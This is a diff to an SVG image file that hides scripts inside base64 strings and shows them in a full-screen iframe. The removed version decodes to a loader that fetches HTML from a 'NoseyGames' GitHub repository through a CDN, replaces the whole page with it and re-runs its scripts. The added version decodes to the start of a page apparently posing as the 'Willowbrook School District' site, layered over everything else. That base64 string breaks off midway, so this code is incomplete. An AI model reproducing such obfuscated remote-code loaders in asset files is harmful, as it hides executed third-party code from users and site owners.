@@ -1,18 +1,11 @@
-<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" style="position: fixed; top: 0; left: 0;">
+<style>[...]</style>
   <foreignObject x="0" y="0" width="100%" height="100%">
-    <body xmlns="http://www.w3.org/1999/xhtml" style="margin:0; padding:0; width:100%; height:100%; overflow:visible;">
-      <iframe 
-        id="willowbrook-exact" 
-        style="width:100vw; height:100vh; border:none; margin:0; padding:0; display:block;" 
-        scrolling="yes">
-      </iframe>
-
-      <script>
-        let b64 = "PHNjcmlwdD4KICAgIGxhdW5jaCgpOwoKICAgIGZ1bmN0aW9uIGxhdW5jaCgpIHsKICAgICAgdHJ5IHsKICAgICAgICBmZXRjaCgiaHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL05vc2V5R2FtZXMvc3Znc0BtYWluL2hvbWVwYWdlLmh0bWw/dD0iK0RhdGUubm93KCkpCiAgICAgICAgICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgICAgICAgICAudGhlbihodG1sID0+IHsKICAgICAgICAgICAgICAgIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5pbm5lckhUTUwgPSBodG1sOwoKICAgICAgICAgICAgICAgIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5xdWVyeVNlbGVjdG9yQWxsKCdzY3JpcHQnKS5mb3JFYWNoKG9sZFNjcmlwdCA9PiB7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgbmV3U2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgICAgICAgICAgICAgaWYgKG9sZFNjcmlwdC5zcmMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgbmV3U2NyaXB0LnNyYyA9IG9sZFNjcmlwdC5zcmM7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgbmV3U2NyaXB0LnRleHRDb250ZW50ID0gb2xkU2NyaXB0LnRleHRDb250ZW50OwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKG5ld1NjcmlwdCk7CiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgIH0pOwogICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIGNvbnNvbGUuZXJyb3IoJ2Vycm9yOicsIGVycm9yKTsKICAgICAgfQogICAgfQoKICA8L3NjcmlwdD4=";
-        
-        var iframe = document.getElementById('willowbrook-exact');
-        iframe.srcdoc = atob(b64);
-      </script>
+    <body xmlns="http://www.w3.org/1999/xhtml">
+    <meta content='width=device-width, initial-scale=1.0' name='viewport'></meta>
+	 <iframe style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" id="test"></iframe>
+         <script>let l = atob("PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+V2lsbG93YnJvb2sgU2Nob29sIERpc3RyaWN0IHwgSW5zcGlyaW5nIFRvbW9ycm93J3MgTGVhZGVyczwvdGl0bGU+CiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG4udGFpbHdpbmRjc3MuY29tIj48L3NjcmlwdD4KICAgIDxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9TnVuaXRvOndnaHRAMzAwOzQwMDs2MDA7NzA4OzgwMCZmYW1pbHk9TG9yYTp3Z2h0QDQwMDs2MDAmZGlzcGxheT1zd2FwIiByZWw9InN0eWxlc2hlZXQiPgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vdW5wa2cuY29tL2x1Y2lkZUBsYXRlc3QiPjwvc2NyaXB0PgogICAgPHN0eWxlIHR5cGU9InRleHQvdGFpbHdpbmRjc3MiPgogICAgICAgIEBsYXllciBiYXNlIHsKICAgICAgICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiAnTnVuaXRvJywgc2Fucy1zZXJpZjsgfQogICAgICAgICAgICBoMSwgaDIsIGgzLCBoNCwgaDUsIGg2IHsgZm9udC1mYW1pbHk6ICdMb3JhJywgc2VyaWY7IH0KICAgICAgICB9CiAgICAgICAgQGxheWVyIHV0aWxpdGllcyB7CiAgICAgICAgICAgIC50ZXh0LWdyYWRpZW50IHsKICAgICAgICAgICAgICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICNmNTllMGIgMCUsICNlYTU4MGMgMTAwJSk7CiAgICAgICAgICAgICAgICAtd2Via2l0LWJhY2tncm91bmQtY2xpcDogdGV4dDsKICAgICAgICAgICAgICAgIG-"); var theIframe = document.getElementById('test'); theIframe.srcdoc = l;</script>
     </body>
   </foreignObject>
+      <script><![CDATA[...]]></script>
 </svg>
